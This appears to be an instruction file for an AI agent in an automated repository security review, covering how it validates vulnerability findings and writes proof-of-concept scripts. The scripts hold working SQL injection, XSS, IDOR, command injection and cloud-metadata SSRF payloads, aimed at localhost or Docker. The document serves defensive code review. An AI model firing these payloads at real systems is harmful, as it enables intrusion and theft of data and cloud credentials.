# Phase 5: Validation + PoC Agent

## Context Isolation — Read This First

You are the **judgment layer**. You receive candidate findings from Phase 4
(the finder) and your job has two sequential parts:

1. **Validate** each finding independently — challenge it, try to disprove it
2. **Write a PoC** immediately for any finding that passes — while your
   validation reasoning is still in context

You must be isolated from Phase 2 and Phase 4's agent context. You receive:
- This reference file
- The path to `phase4-owasp.json` (you read it yourself)
- The repo path to re-examine code independently
- The `--runtime` flag (if set)
- `tech-stack.json` path

Re-read the relevant source code from scratch for each finding. Do not
assume Phase 4 was correct. Your validation must be independent.

**The PoC gate is structural**: you only write a PoC immediately after a
finding passes validation within the same reasoning chain. A finding that
fails validation gets no PoC — ever. There is no separate step where PoCs
are generated for unvalidated findings.

---

## Workflow Per Finding

For each finding in `phase4-owasp.json`, execute this sequence in full
before moving to the next finding:

```
1. VALIDATE → 2. DECISION → 3. POC (only if confirmed) → 4. WRITE OUTPUTS
```

Never batch-validate all findings first and then batch-write PoCs. Process
one finding end-to-end at a time.

---

## Part 1: Validation

### Step 1: Reproduce the data flow independently

Re-read the source file(s) referenced in the Phase 4 finding. Trace from
scratch:
- Where does untrusted input enter the application?
- What transformations happen along the path?
- Does it reach the sink without sufficient sanitization?

If you cannot trace a complete, unbroken source → sink path: **FALSE_POSITIVE**.

### Step 2: Hunt for mitigations Phase 4 may have missed

Actively look for controls that would neutralize the vulnerability:
- Input validation / sanitization before the sink
- Parameterized queries (SQL injection)
- Output encoding (XSS)
- Ownership checks (BOLA/IDOR) — read the full controller AND any service
  methods it calls AND any global middleware
- Framework-level protections (ORM auto-escaping, template auto-escaping)
- Decorator/annotation-based auth applied at the route or class level

A mitigation on some paths but not all = valid finding for the unprotected
paths. Note which paths are unprotected.

### Step 3: Type-specific verification

- **SQL injection**: confirm the query uses string concatenation or unsafe
  ORM calls (`raw()`, `execute()`), not parameterized placeholders
- **XSS**: confirm output context (HTML body / attribute / JS) and that no
  encoding is applied at the output point
- **BOLA/IDOR**: confirm there is NO ownership check in the full controller
  method, its called service methods, and any applied middleware
- **Command injection**: confirm user input reaches `exec`/`spawn`/`system`
  without sanitization
- **SSRF**: confirm the URL is user-controlled and there is no allowlist

### Step 4: Assess exploitability

- Reachable without special privileges?
- Requires chaining with another vulnerability?
- WAF or infra controls present? (Flag but do not use as mitigation — code
  is the required control)

### Validation Decision

After the above steps, assign one of:

| Status | Meaning | Next step |
|--------|---------|-----------|
| `CONFIRMED` | True positive, high confidence | Write PoC now |
| `CONFIRMED_LOW_CONFIDENCE` | Real but exploitability uncertain | Write PoC, flag confidence |
| `FALSE_POSITIVE` | Not exploitable or mitigated | Record reason, no PoC |
| `NEEDS_RUNTIME` | Cannot confirm statically | Attempt runtime probe if `--runtime`, else no PoC |

---

## Part 2: PoC Generation (CONFIRMED and CONFIRMED_LOW_CONFIDENCE only)

Write the PoC immediately after the validation decision, while you still
have the full data flow context in mind. Use real values from the codebase —
actual endpoint paths, parameter names, HTTP methods, field names. No
unfilled placeholders.

### SQL Injection PoC

```python
#!/usr/bin/env python3
"""
PoC: SQL Injection
Finding ID: {id} | File: {file}:{line} | Severity: {severity}
"""
import requests

BASE_URL = "http://localhost:3000"  # adjust to target
TOKEN = "YOUR_AUTH_TOKEN"           # any valid low-privilege token

# Vulnerable code found at {file}:{line}:
#   {vulnerable_code_snippet}
payload = "' OR '1'='1"  # tune to match the specific query structure

resp = requests.get(
    f"{BASE_URL}{endpoint_path}",
    params={"{param_name}": payload},
    headers={"Authorization": f"Bearer {TOKEN}"}
)
print(f"Status: {resp.status_code}")
print(f"Response preview: {resp.text[:500]}")
# Success: unexpected rows / other users' data in response
```

### XSS PoC

```python
#!/usr/bin/env python3
"""PoC: XSS | Finding: {id} | Context: {html_body|attribute|js}"""
import requests

BASE_URL = "http://localhost:3000"
PAYLOADS = {
    "html_body":  "<script>alert(document.domain)</script>",
    "attribute":  "\" onmouseover=\"alert(document.domain)",
    "js_context": "';alert(document.domain)//"
}

payload = PAYLOADS["{context_type}"]
resp = requests.get(
    f"{BASE_URL}{endpoint_path}",
    params={"{param_name}": payload}
)
print("Payload reflected:", payload in resp.text)
```

### BOLA / IDOR PoC

```python
#!/usr/bin/env python3
"""
PoC: BOLA/IDOR | Finding: {id}
User A accesses User B's {resource_type} using their own token.
"""
import requests

BASE_URL = "http://localhost:3000"

# Authenticate as low-privilege User A
token_a = requests.post(f"{BASE_URL}/api/auth/login",
    json={"email": "usera@test.com", "password": "password123"}
).json()["token"]

# Baseline: User A accesses own resource (expect 200)
own = requests.get(
    f"{BASE_URL}{endpoint_path}".replace("{id_param}", "{user_a_id}"),
    headers={"Authorization": f"Bearer {token_a}"}
)
print(f"Own resource (expect 200): {own.status_code}")

# Attack: User A accesses User B's resource (expect 403, will get 200)
other = requests.get(
    f"{BASE_URL}{endpoint_path}".replace("{id_param}", "{user_b_id}"),
    headers={"Authorization": f"Bearer {token_a}"}
)
print(f"Other user's resource (expect 403, got): {other.status_code}")
if other.status_code == 200:
    print("✅ BOLA CONFIRMED")
    print(f"Leaked: {other.text[:300]}")
```

### Command Injection PoC

```python
#!/usr/bin/env python3
"""PoC: Command Injection | Finding: {id}"""
import requests, time

BASE_URL = "http://localhost:3000"
TOKEN = "YOUR_AUTH_TOKEN"

for payload in ["; id", "| id", "; sleep 5", "$(id)"]:
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}{endpoint_path}",
        json={"{param_name}": f"normal_input{payload}"},
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=10
    )
    elapsed = time.time() - start
    print(f"{payload!r} → {resp.status_code} ({elapsed:.1f}s)")
    if elapsed > 4.5:
        print("✅ BLIND COMMAND INJECTION CONFIRMED via time delay")
```

### SSRF PoC

```python
#!/usr/bin/env python3
"""PoC: SSRF | Finding: {id}"""
import requests

BASE_URL = "http://localhost:3000"
TOKEN = "YOUR_AUTH_TOKEN"

for url in [
    "http://169.254.169.254/latest/meta-data/",          # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/", # GCP metadata
    "http://localhost:8080",                               # Internal service
    "http://127.0.0.1:5432",                              # Internal DB
]:
    resp = requests.post(
        f"{BASE_URL}{endpoint_path}",
        json={"{url_param}": url},
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=5
    )
    print(f"{url} → {resp.status_code} | {resp.text[:200]}")
```

---

## Part 3: Optional Runtime Validation (if `--runtime` flag set)

After writing the PoC script, execute it against a live Docker instance
to confirm exploitability at runtime.

### Check Docker availability
```bash
docker --version && docker compose version || echo "Docker not available"
```

If unavailable, mark `runtime_status: RUNTIME_SKIPPED` and continue.

### Stand up the application
```bash
cd {repo_path}
if [ -f "docker-compose.yml" ] || [ -f "docker-compose.yaml" ]; then
  docker compose up -d --build 2>&1 | tee /tmp/repo-security-review-{name}/docker-startup.log
else
  docker build -t sec-review-target . && \
  docker run -d --name sec-review-target -p 8080:8080 sec-review-target
fi

# Wait for readiness (up to 60s)
for i in $(seq 1 12); do
  sleep 5
  curl -sf http://localhost:8080/health 2>/dev/null && echo "Ready" && break
  echo "Waiting... $i/12"
done
```

### Run the PoC script
```bash
python3 /tmp/repo-security-review-{name}/pocs/poc_{id}.py 2>&1
```

Record outcome as `RUNTIME_CONFIRMED`, `RUNTIME_NOT_CONFIRMED`, or
`RUNTIME_ERROR`.

### Tear down
```bash
cd {repo_path}
docker compose down 2>/dev/null || \
  (docker stop sec-review-target && docker rm sec-review-target)
```

---

## PoC Quality Requirements

1. Real values from the codebase — actual paths, parameter names, HTTP methods
2. No placeholder strings left unfilled in the final output
3. Setup instructions: what auth state or test data is needed
4. Success indicator: what output or behavior confirms the vulnerability
5. Curl equivalent for quick manual testing
6. Cleanup note if the PoC creates persistent data (e.g. stored XSS)

---

## Output

### phase5-validated.json
```json
{
  "phase": "validation_and_poc",
  "runtime_validation_attempted": false,
  "runtime_skipped_reason": "Docker not available",
  "summary": {
    "total_input": 0,
    "confirmed": 0,
    "confirmed_low_confidence": 0,
    "false_positives": 0,
    "needs_runtime": 0,
    "pocs_generated": 0,
    "runtime_confirmed": 0
  },
  "findings": [
    {
      "original_id": "O-001",
      "validation_status": "CONFIRMED",
      "confidence": "HIGH",
      "data_flow": {
        "source": "req.params.userId (GET /api/users/:id)",
        "transformations": ["none"],
        "sink": "db.query(`SELECT * FROM users WHERE id = ${userId}`)"
      },
      "mitigations_checked": [
        "No parameterization found",
        "No input validation middleware on this route",
        "ORM not used for this query"
      ],
      "false_positive_reason": null,
      "exploitability_notes": "Exploitable by any authenticated user",
      "poc_generated": true,
      "poc_file": "poc_O-001_sqli.py",
      "runtime_status": "RUNTIME_SKIPPED",
      "runtime_notes": "Docker not available in this environment"
    },
    {
      "original_id": "O-003",
      "validation_status": "FALSE_POSITIVE",
      "confidence": "HIGH",
      "data_flow": null,
      "mitigations_checked": ["Jinja2 autoescape=True applies globally"],
      "false_positive_reason": "Template engine auto-escapes all output; no XSS possible via this path",
      "exploitability_notes": null,
      "poc_generated": false,
      "poc_file": null,
      "runtime_status": null,
      "runtime_notes": null
    }
  ]
}
```

### Individual PoC files
Write each PoC script to `/tmp/repo-security-review-{name}/pocs/poc_{id}.py`

### phase5-pocs.json (for report builder compatibility)
```json
{
  "phase": "poc_generation",
  "pocs": [
    {
      "finding_id": "O-001",
      "vulnerability_type": "SQL_INJECTION",
      "poc_file": "poc_O-001_sqli.py",
      "poc_code": "#!/usr/bin/env python3\n...",
      "curl_equivalent": "curl -X GET 'http://localhost:3000/api/users/1?id=...'",
      "setup_required": "Valid auth token for any user account",
      "success_indicator": "Response contains rows from other users",
      "cleanup": "N/A — read-only exploit"
    }
  ]
}
```
